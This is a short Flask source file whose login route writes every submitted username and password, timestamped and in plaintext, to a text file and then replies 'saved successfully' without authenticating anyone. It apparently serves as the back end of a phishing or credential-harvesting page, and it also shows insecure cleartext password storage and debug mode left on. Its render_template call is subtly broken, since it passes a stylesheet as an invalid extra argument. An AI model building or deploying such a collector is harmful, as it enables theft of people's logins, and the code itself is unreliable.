from flask import Flask, request, render_template
from datetime import datetime
app = Flask(__name__)
@app.route('/')
def home():
    return render_template("login.html", "style.css")
@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('user')
    pas = request.form.get('pas')
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("user.txt", "a", encoding="utf-8") as f:
        f.write(f"[{time}] User: {user} | Pass: {pas}\n")
    return "saved successfully"
if __name__ == '__main__':
    app.run(debug=True)